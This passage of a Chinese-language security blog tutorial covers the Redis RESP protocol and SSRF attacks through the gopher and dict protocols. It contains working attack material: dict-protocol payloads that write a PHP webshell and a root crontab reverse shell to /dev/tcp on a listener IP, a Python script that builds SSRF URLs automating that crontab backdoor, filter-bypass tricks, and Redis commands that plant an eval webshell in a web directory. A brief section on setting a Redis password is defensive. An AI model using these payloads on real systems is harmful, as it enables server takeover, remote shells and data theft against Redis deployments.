+<p><strong>在 RESP 中，某些数据的类型取决于第一个字节：</strong><br><strong>对于 <code>Simple Strings</code> ，回复的第一个字节是 <code>+</code></strong><br><strong>对于 <code>error</code> ，回复的第一个字节是<code>-</code></strong><br><strong>对于 <code>Integer</code> ，回复的第一个字节是<code>:</code></strong><br><strong>对于 <code>Bulk Strings</code> ，回复的第一个字节是<code>$</code></strong><br><strong>对于 <code>array</code> ，回复的第一个字节是<code>*</code></strong><br><strong>此外，<code>RESP</code> 能够使用稍后指定的 <code>Bulk Strings</code> 或<code> Array</code> 的特殊变体来表示 <code>Null</code> 值。</strong><br><strong>在RESP中，协议的不同部分始终以 <code>&quot;\r\n&quot;(CRLF)</code> 结束。</strong></p>
+</blockquote>
+<p>可以用<code>tcpdump</code>来抓个包来测试一下</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump port 6379 -w ./1.pcap</span><br></pre></td></tr></table></figure></div>
+
+<p>redis客户端中执行如下命令</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">192.168.163.128:6379&gt; set name test</span><br><span class="line">OK</span><br><span class="line">192.168.163.128:6379&gt; get name</span><br><span class="line">&quot;test&quot;</span><br><span class="line">192.168.163.128:6379&gt;</span><br></pre></td></tr></table></figure></div>
+
+
+
+<p>抓到的数据包如下</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/blog/20190713085931-794d2d5e-a509-1-17057593958178.png"
+                      alt="20190713085931-794d2d5e-a509-1"
+                >	</p>
+<p>hex转储看一下</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/blog/20190713090053-a9d401f0-a509-1-170575940818512.png"
+                      alt="20190713090053-a9d401f0-a509-1"
+                ></p>
+<p>正如我们前面所说的，客户端向将命令作为<code>Bulk Strings</code>的RESP数组发送到Redis服务器，然后服务器根据命令实现回复给客户端一种RESP类型。<br>我们就拿上面的数据包分析，首先是<code>*3</code>，代表数组的长度为3（可以简单理解为用空格为分隔符将命令分割为[“set”,”name”,”test”]）；<code>$4</code>代表字符串的长度，<code>0d0a</code>即<code>\r\n</code>表示结束符；<code>+OK</code>表示服务端执行成功后返回的字符串</p>
+<h3 id="Gopher协议"><a href="#Gopher协议" class="headerlink" title="Gopher协议"></a>Gopher协议</h3><p><code>Gopher</code> 协议是 HTTP 协议出现之前，在 Internet 上常见且常用的一个协议，不过现在gopher协议用得已经越来越少了</p>
+<p><code>Gopher</code> 协议可以说是SSRF中的万金油。利用此协议可以攻击内网的 redis、ftp等等，也可以发送 GET、POST 请求。这无疑极大拓宽了 SSRF 的攻击面。</p>
+<p> 万金油协议！！！</p>
+<p>语法格式：<code>gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher_path&gt;_value</code>（host为IP地址；port为指定端口，没写的话默认为70端口；”_”是一种数据连接格式，任意字符都行，因为gopher会吞噬第一个字符；value为TCP数据流）</p>
+<p> 如果发起为POST请求，回车换行使用%0D%0A（有些博客说的需要双重 URL 编码，即<code>%250d%250a</code>，反正后续脚本一次编码和二次编码都写了，都试试就知道了）；如果多个参数，参数之间的&amp;也需要进行URL编码。</p>
+<div class="highlight-container" data-rel="Perl"><figure class="iseeu highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">GET请求</span><br><span class="line">源码</span><br><span class="line">&lt;?php</span><br><span class="line">$a = $_GET[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">echo <span class="string">&quot;Hello!&quot;</span>.$a; </span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">下面是我们要请求的TCP数据流</span><br><span class="line">GET /flag.php?a=atao HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">192.168</span>.<span class="number">159.131</span></span><br><span class="line"></span><br><span class="line">转成url编码的格式（最后一句结尾也要%0d%0a，所以要加上）</span><br><span class="line">%47%45%54%2<span class="number">0</span>%<span class="number">2</span>f%66%<span class="number">6</span>c%61%67%<span class="number">2</span>e%7<span class="number">0</span>%68%7<span class="number">0</span>%<span class="number">3</span>f%61%<span class="number">3</span>d%61%74%61%<span class="number">6</span>f%2<span class="number">0</span>%48%54%54%5<span class="number">0</span>%<span class="number">2</span>f%31%<span class="number">2</span>e%31%0d%0a%48%<span class="number">6</span>f%73%74%<span class="number">3</span>a%2<span class="number">0</span>%31%39%32%<span class="number">2</span>e%31%36%38%<span class="number">2</span>e%31%35%39%<span class="number">2</span>e%31%33%31%0d%0a</span><br><span class="line"></span><br><span class="line">curl gopher:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">159.131</span>:<span class="number">80</span>/<span class="number">_</span>%47%45%54%2<span class="number">0</span>%<span class="number">2</span>f%66%<span class="number">6</span>c%61%67%<span class="number">2</span>e%7<span class="number">0</span>%68%7<span class="number">0</span>%<span class="number">3</span>f%61%<span class="number">3</span>d%61%74%61%<span class="number">6</span>f%2<span class="number">0</span>%48%54%54%5<span class="number">0</span>%<span class="number">2</span>f%31%<span class="number">2</span>e%31%0d%0a%48%<span class="number">6</span>f%73%74%<span class="number">3</span>a%2<span class="number">0</span>%31%39%32%<span class="number">2</span>e%31%36%38%<span class="number">2</span>e%31%35%39%<span class="number">2</span>e%31%33%31%0d%0a</span><br><span class="line"></span><br><span class="line">返回</span><br><span class="line">HTTP/<span class="number">1.1</span> <span class="number">200</span> OK</span><br><span class="line">Date: Mon, <span class="number">02</span> Nov <span class="number">2020</span> <span class="number">16</span>:09:<span class="number">33</span> GMT</span><br><span class="line">Server: Apache/<span class="number">2.4</span>.<span class="number">23</span> (Win32) OpenSSL/<span class="number">1.0</span>.<span class="number">2</span>j mod_fcgid/<span class="number">2.3</span>.<span class="number">9</span></span><br><span class="line">X-Powered-By: PHP/<span class="number">5.4</span>.<span class="number">45</span></span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Content-Type: text/html</span><br><span class="line"></span><br><span class="line">a</span><br><span class="line">Hello!atao</span><br><span class="line"><span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">POST请求</span><br><span class="line">源码</span><br><span class="line">&lt;?php</span><br><span class="line">$a = $_POST[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">echo <span class="string">&quot;Hello!&quot;</span>.$a; </span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">用原来的方式进行请求</span><br><span class="line">GET /flag.php HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">192.168</span>.<span class="number">159.131</span></span><br><span class="line"></span><br><span class="line">a=atao</span><br><span class="line">这样会报错，POST请求需要多加两个参数Content-Type和Content-Length</span><br><span class="line"></span><br><span class="line">修改后为</span><br><span class="line">POST /flag.php HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">192.168</span>.<span class="number">159.131</span></span><br><span class="line">Content-Type: application/<span class="keyword">x</span>-www-form-urlencoded</span><br><span class="line">Content-Length: <span class="number">6</span></span><br><span class="line"></span><br><span class="line">a=atao</span><br><span class="line"></span><br><span class="line">转成url编码的格式（这次结尾不用加%0d%0a，因为最后是参数）</span><br><span class="line">%5<span class="number">0</span>%<span class="number">4</span>f%53%54%2<span class="number">0</span>%<span class="number">2</span>f%66%<span class="number">6</span>c%61%67%<span class="number">2</span>e%7<span class="number">0</span>%68%7<span class="number">0</span>%2<span class="number">0</span>%48%54%54%5<span class="number">0</span>%<span class="number">2</span>f%31%<span class="number">2</span>e%31%0d%0a%48%<span class="number">6</span>f%73%74%<span class="number">3</span>a%2<span class="number">0</span>%31%39%32%<span class="number">2</span>e%31%36%38%<span class="number">2</span>e%31%35%39%<span class="number">2</span>e%31%33%31%0d%0a%43%<span class="number">6</span>f%<span class="number">6</span>e%74%65%<span class="number">6</span>e%74%<span class="number">2</span>d%54%79%7<span class="number">0</span>%65%<span class="number">3</span>a%2<span class="number">0</span>%61%7<span class="number">0</span>%7<span class="number">0</span>%<span class="number">6</span>c%69%63%61%74%69%<span class="number">6</span>f%<span class="number">6</span>e%<span class="number">2</span>f%78%<span class="number">2</span>d%77%77%77%<span class="number">2</span>d%66%<span class="number">6</span>f%72%<span class="number">6</span>d%<span class="number">2</span>d%75%72%<span class="number">6</span>c%65%<span class="number">6</span>e%63%<span class="number">6</span>f%64%65%64%0d%0a%43%<span class="number">6</span>f%<span class="number">6</span>e%74%65%<span class="number">6</span>e%74%<span class="number">2</span>d%<span class="number">4</span>c%65%<span class="number">6</span>e%67%74%68%<span class="number">3</span>a%2<span class="number">0</span>%36%0d%0a%0d%0a%61%<span class="number">3</span>d%61%74%61%6f</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">curl gopher:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">159.131</span>:<span class="number">80</span>/<span class="number">_</span>%5<span class="number">0</span>%<span class="number">4</span>f%53%54%2<span class="number">0</span>%<span class="number">2</span>f%66%<span class="number">6</span>c%61%67%<span class="number">2</span>e%7<span class="number">0</span>%68%7<span class="number">0</span>%2<span class="number">0</span>%48%54%54%5<span class="number">0</span>%<span class="number">2</span>f%31%<span class="number">2</span>e%31%0d%0a%48%<span class="number">6</span>f%73%74%<span class="number">3</span>a%2<span class="number">0</span>%31%39%32%<span class="number">2</span>e%31%36%38%<span class="number">2</span>e%31%35%39%<span class="number">2</span>e%31%33%31%0d%0a%43%<span class="number">6</span>f%<span class="number">6</span>e%74%65%<span class="number">6</span>e%74%<span class="number">2</span>d%54%79%7<span class="number">0</span>%65%<span class="number">3</span>a%2<span class="number">0</span>%61%7<span class="number">0</span>%7<span class="number">0</span>%<span class="number">6</span>c%69%63%61%74%69%<span class="number">6</span>f%<span class="number">6</span>e%<span class="number">2</span>f%78%<span class="number">2</span>d%77%77%77%<span class="number">2</span>d%66%<span class="number">6</span>f%72%<span class="number">6</span>d%<span class="number">2</span>d%75%72%<span class="number">6</span>c%65%<span class="number">6</span>e%63%<span class="number">6</span>f%64%65%64%0d%0a%43%<span class="number">6</span>f%<span class="number">6</span>e%74%65%<span class="number">6</span>e%74%<span class="number">2</span>d%<span class="number">4</span>c%65%<span class="number">6</span>e%67%74%68%<span class="number">3</span>a%2<span class="number">0</span>%36%0d%0a%0d%0a%61%<span class="number">3</span>d%61%74%61%6f</span><br><span class="line"></span><br><span class="line">返回</span><br><span class="line">HTTP/<span class="number">1.1</span> <span class="number">200</span> OK</span><br><span class="line">Date: Mon, <span class="number">02</span> Nov <span class="number">2020</span> <span class="number">16</span>:<span class="number">19</span>:<span class="number">16</span> GMT</span><br><span class="line">Server: Apache/<span class="number">2.4</span>.<span class="number">23</span> (Win32) OpenSSL/<span class="number">1.0</span>.<span class="number">2</span>j mod_fcgid/<span class="number">2.3</span>.<span class="number">9</span></span><br><span class="line">X-Powered-By: PHP/<span class="number">5.4</span>.<span class="number">45</span></span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Content-Type: text/html</span><br><span class="line"></span><br><span class="line">a</span><br><span class="line">Hello!atao</span><br><span class="line"><span class="number">0</span></span><br></pre></td></tr></table></figure></div>
+
+
+
+<h3 id="Dict协议"><a href="#Dict协议" class="headerlink" title="Dict协议"></a>Dict协议</h3><p> 在SSRF中，主要是用来查看端口服务是否开启的，但是在Redis中如果无法使用Gopher协议，则可以通过该协议进行替代，不过该协议不能进行多行命令执行（只能执行一行），当传输命令时，dict 协议的话要一条一条的执行，所以一般 dict 协议只是当个备胎用。</p>
+<p> 语法格式：<code>dict:////&lt;host&gt;:&lt;port&gt;/&lt;value&gt;</code>（host为IP地址；port为指定端口；value为请求内容）</p>
+<p><strong>注意要点：</strong></p>
+<ul>
+<li><p><code>&lt;value&gt;</code> 处的冒号相当于空格。</p>
+</li>
+<li><p>与 gopher 不同的是，使用 dict 协议并不会吞噬第一个字符，并且会多加一个 quit 字符串，自动添加 CRLF 换行。</p>
+</li>
+<li><p>在传输命令时，若命令中有空格，则该命令需要做一次<strong>十六进制编码</strong></p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cmd = <span class="string">&quot;\n\n* * * * * root bash -i &gt;&amp; /dev/tcp/192.168.230.132/1234 0&gt;&amp;1\n\n&quot;</span></span><br><span class="line">cmd_encoder = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> single_char <span class="keyword">in</span> cmd:</span><br><span class="line">    cmd_encoder += <span class="built_in">hex</span>(<span class="built_in">ord</span>(single_char).replace(<span class="string">&quot;0xa&quot;</span>,<span class="string">&quot;0x0a&quot;</span>).replace(<span class="string">&quot;0x&quot;</span>,<span class="string">&quot;\\\\x&quot;</span>))</span><br><span class="line"><span class="built_in">print</span>(cmd_encoder)</span><br></pre></td></tr></table></figure></div></li>
+</ul>
+<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">使用命令</span><br><span class="line"><span class="built_in">curl</span> <span class="literal">-g</span> <span class="string">&quot;dict://127.0.0.1:6397/set:koishi:cirno&quot;</span></span><br><span class="line"></span><br><span class="line">返回</span><br><span class="line"><span class="literal">-ERR</span> Unknown subcommand or wrong number of arguments <span class="keyword">for</span> <span class="string">&#x27;libcurl&#x27;</span>. <span class="keyword">Try</span> CLIENT HELP</span><br><span class="line">+OK</span><br><span class="line">+OK</span><br><span class="line"></span><br><span class="line">抓包看到的</span><br><span class="line">CLIENT libcurl <span class="number">7.68</span>.<span class="number">0</span></span><br><span class="line"><span class="built_in">set</span> koishi cirno</span><br><span class="line">QUIT</span><br><span class="line"></span><br><span class="line">来自郁神的解释</span><br><span class="line">第一行是代表发出的<span class="built_in">cli</span>的工具和版本</span><br><span class="line">第二行是执行我们请求的命令</span><br><span class="line">第三行是自行退出</span><br><span class="line">从这里我们就不难看出为啥dict不适合Redis认证的题目了，每次只能执行一条命令，执行完后还会退出，没有余力做别的操作</span><br><span class="line">这里返回第一行报错了，应该是没有带参数而报错的</span><br></pre></td></tr></table></figure></div>
+
+
+
+<h4 id="Dict-使用例子"><a href="#Dict-使用例子" class="headerlink" title="Dict 使用例子"></a>Dict 使用例子</h4><p><strong>例子1，写马</strong></p>
+<div class="highlight-container" data-rel="Cmd"><figure class="iseeu highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">写入恶意代码：（&lt;? 等特殊符号需要转义，不然问号后面会导致截断无法写入）</span><br><span class="line">/link.php?u=dict://<span class="number">0</span>:<span class="number">6379</span>/<span class="built_in">set</span>:shell:&quot;\x3C\x3Fphp\x20echo`$_GET[x]`\x3B\x3F\x3E&quot;</span><br><span class="line"></span><br><span class="line">设置保存路径：</span><br><span class="line">/link.php?u=dict://<span class="number">0</span>:<span class="number">6379</span>/config:<span class="built_in">set</span>:<span class="built_in">dir</span>:/var/www/html/</span><br><span class="line"></span><br><span class="line">设置保存名字：</span><br><span class="line">/link.php?u=dict://<span class="number">0</span>:<span class="number">6379</span>/config:<span class="built_in">set</span>:dbfilename:shell.php</span><br><span class="line"></span><br><span class="line">保存：</span><br><span class="line">/link.php?u=dict://<span class="number">0</span>:<span class="number">6379</span>/save</span><br></pre></td></tr></table></figure></div>
+
+
+
+<p><strong>例子2，写定时任务</strong></p>
+<div class="highlight-container" data-rel="Cmd"><figure class="iseeu highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> <span class="number">1</span> &quot;\n\n\n\n* * * * * root bash -i &gt;&amp; /dev/tcp/<span class="number">192</span>.<span class="number">168</span>.<span class="number">230</span>.<span class="number">132</span>/<span class="number">1234</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span>\n\n\n\n&quot;</span><br><span class="line">对应</span><br><span class="line"><span class="function">dict://172.2.0.2:6379/<span class="title">set</span>:1:\&quot;十六进制编码\&quot;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">config</span> <span class="title">set</span> <span class="title">dir</span> /<span class="title">etc</span>/</span></span><br><span class="line"><span class="function">对应：</span></span><br><span class="line"><span class="function"><span class="title">dict</span>://172.2.0.2:6379/<span class="title">config:set</span>:<span class="title">dir</span>:/<span class="title">etc</span>/</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">config</span> <span class="title">set</span> <span class="title">dbfilename</span> <span class="title">crontab</span></span></span><br><span class="line"><span class="function">对应：</span></span><br><span class="line"><span class="function"><span class="title">dict</span>://172.2.0.2:6379/<span class="title">config:set</span>:<span class="title">dbfilename:crontab</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">save</span></span></span><br><span class="line"><span class="function">对应：</span></span><br><span class="line"><span class="function"><span class="title">dict</span>://172.2.0.2:6379/<span class="title">save</span></span></span><br></pre></td></tr></table></figure></div>
+
+<p>写入的payload中<code>* * * * *</code> 意义：</p>
+<p><code>* * * * *</code> 是一个 cron 表达式，用于表示定时任务的执行时间。Cron 是一种用于在 UNIX&#x2F;Linux 系统中执行预定任务的时间表达式。这五个星号分别代表分钟、小时、日期、月份和星期。</p>
+<p><code>*</code>是通配符，表示”每”。在这里，<code>* * * * *</code> 表示每分钟的每秒都执行。</p>
+<p>因此，<code>* * * * *</code> 表达式表示每分钟都执行一次定时任务。</p>
+<h4 id="绕过-截断"><a href="#绕过-截断" class="headerlink" title="绕过?截断"></a>绕过?截断</h4><p> 主要用于dict协议中，当dict协议要写入键值对，如：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">dict://127.0.0.1:6379/set:atao:&lt;?php phpinfo();?&gt;</span><br><span class="line"></span><br><span class="line">接收到的内容</span><br><span class="line">CLIENT libcurl 7.68.0</span><br><span class="line">set atao &lt;</span><br><span class="line">QUIT</span><br><span class="line">可以看到?以及后面的内容都没了</span><br><span class="line"></span><br><span class="line">这里通过对&lt;?等特殊符号进行转义绕过</span><br><span class="line">dict://127.0.0.1:6379/set:atao:\x3c\x3fphp\x20phpinfo0x28\x29\x3b\x3f\x3e</span><br></pre></td></tr></table></figure></div>
+
+
+
+<h4 id="绕过-本地-判断"><a href="#绕过-本地-判断" class="headerlink" title="绕过 本地 判断"></a>绕过 本地 判断</h4><p>当限制了gopher和127、localhost 等字符时，可以使用 0 代表当前IP或域名解析等方式即可绕过访问本地限制，使用dict协议写入redis。</p>
+<h4 id="一键式-ssrf-redis-dict-利用脚本"><a href="#一键式-ssrf-redis-dict-利用脚本" class="headerlink" title="一键式 ssrf + redis + dict 利用脚本"></a>一键式 ssrf + redis + dict 利用脚本</h4><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://192.168.0.109/ssrf/base/curl_exec.php?url=&quot;</span>  <span class="comment"># 存在 ssrf 的 url</span></span><br><span class="line">target = <span class="string">&quot;dict://192.168.0.119:6379/&quot;</span>  <span class="comment"># redis 服务器地址</span></span><br><span class="line">cmds = [<span class="string">&#x27;set:mars:\\\\&quot;\\n* * * * * root bash -i &gt;&amp; /dev/tcp/192.168.0.119/9999 0&gt;&amp;1\\n\\\\&quot;&#x27;</span>,  <span class="comment"># shell接收地址与端口号</span></span><br><span class="line">        <span class="string">&quot;config:set:dir:/etc/&quot;</span>,</span><br><span class="line">        <span class="string">&quot;config:set:dbfilename:crontab&quot;</span>,</span><br><span class="line">        <span class="string">&quot;bgsave&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> cmd <span class="keyword">in</span> cmds:</span><br><span class="line">    cmd_encoder = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> single_char <span class="keyword">in</span> cmd:</span><br><span class="line">        <span class="comment"># 先转为ASCII</span></span><br><span class="line">        cmd_encoder += <span class="built_in">hex</span>(<span class="built_in">ord</span>(single_char)).replace(<span class="string">&quot;0x&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    cmd_encoder = binascii.a2b_hex(cmd_encoder)</span><br><span class="line">    cmd_encoder = urllib.parse.quote(cmd_encoder, <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    payload = url + target + cmd_encoder</span><br><span class="line">    <span class="built_in">print</span>(payload)</span><br><span class="line">    <span class="comment"># request = urllib.request.Request(payload)</span></span><br><span class="line">    <span class="comment"># response = urllib.request.urlopen(request).read()</span></span><br></pre></td></tr></table></figure></div>
+
+
+
+
+
+<h2 id="5-漏洞攻击"><a href="#5-漏洞攻击" class="headerlink" title="5.漏洞攻击"></a>5.漏洞攻击</h2><h3 id="未授权访问漏洞"><a href="#未授权访问漏洞" class="headerlink" title="未授权访问漏洞"></a>未授权访问漏洞</h3><p>由于配置不当的原因，导致Redis服务暴露在公网（即绑定在0.0.0.0:6379），并且没有开启相关认证和添加相关安全策略的情况下，即存在未授权访问漏洞。</p>
+<p>攻击者在未授权访问Redis的情况下，可以获取数据库的所有数据、删除数据库数据等，进一步地可以利用Redis相关方法来实现写入WebShell、写入Crontab定时任务、写入SSH公钥以及利用主从复制RCE等一系列的攻击利用，将Redis未授权访问漏洞的危害无限放大。</p>
+<h4 id="安全配置密码验证"><a href="#安全配置密码验证" class="headerlink" title="安全配置密码验证"></a>安全配置密码验证</h4><p>我们可以通过Redis的配置文件设置密码参数，这样客户端连接到Redis服务就需要密码验证，这样可以让你的Redis服务更安全，进而杜绝了未授权访问漏洞。</p>
+<p>我们可以通过以下命令查看是否设置了密码验证：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; CONFIG get requirepass</span><br><span class="line">1) &quot;requirepass&quot;</span><br><span class="line">2) &quot;&quot;</span><br></pre></td></tr></table></figure></div>
+
+<p>默认情况下requirepass参数是空的，这就意味着你无需通过密码验证就可以连接到Redis服务。</p>
+<p>你可以通过以下命令来修改该参数：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; CONFIG set requirepass &quot;koishi&quot;</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; CONFIG get requirepass</span><br><span class="line">1) &quot;requirepass&quot;</span><br><span class="line">2) &quot;koishi&quot;</span><br></pre></td></tr></table></figure></div>
+
+<p>设置密码后，客户端连接Redis服务就需要密码验证，否则无法执行命令。</p>
+<p>密码验证用到AUTH命令，如下：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; AUTH &quot;password&quot;</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; SET mykey &quot;Test value&quot;</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; GET mykey</span><br><span class="line">&quot;Test value&quot;</span><br></pre></td></tr></table></figure></div>
+
+
+
+<h4 id="敏感信息泄露与数据库内容删除"><a href="#敏感信息泄露与数据库内容删除" class="headerlink" title="敏感信息泄露与数据库内容删除"></a>敏感信息泄露与数据库内容删除</h4><p>使用Redis的语句可以获取数据库中的存储的敏感信息，这里为了方便直接通过<code>keys *</code>来获取所有的键，然后通过get命令获取键值（如果在实际的业务中，一般不会查询所有键，因为对性能影响太大了，而是通过查询指定的某些数据库内容）：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/blog/image-20240120154220788.png"
+                      alt="image-20240120154220788"
+                ></p>
+<p>使用info命令可以看到Redis的版本、OS内核版本、配置文件路径等信息：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/blog/image-20240120154454909.png"
+                      alt="image-20240120154454909"
+                ></p>
+<p>使用flushall等相关命令可以将Redis数据库所有内容删除掉，注意要慎用，这里就不演示了。</p>
+<h4 id="向Web目录写入WebShell"><a href="#向Web目录写入WebShell" class="headerlink" title="向Web目录写入WebShell"></a>向Web目录写入WebShell</h4><p>前提是Redis所在机子开启了Web服务，且已知Web服务目录路径。</p>
+<p>原理就是在Redis中插入一条数据，将WebShell代码作为value，key值随意，然后通过修改数据库的默认路径为Web服务目录和默认的缓存文件为WebShell文件，最后通过save命令以备份的方式把缓存的数据保存在文件里，这样就可以在服务器端的Web目录下生成一个WebShell文件。</p>
+<p>具体步骤就是先写入一个含WebShell代码的键值，然后设置备份目录为Web目录，接着设置备份文件名为WebShell文件名，最后通过save命令保存文件到本地。如下：</p>
+<p>我这里服务目录在：<code>/home/kali/Desktop/temp</code> ，根据实际情况修改</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set payload &quot;&lt;?php @eval($_POST[1]);?&gt;&quot;</span><br><span class="line">config set dir /home/kali/Desktop/temp</span><br><span class="line">config set dbfilename koishi.php</span><br><span class="line">save</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/blog/image-20240120155730136.png"
+                      alt="image-20240120155730136"
+                ></p>
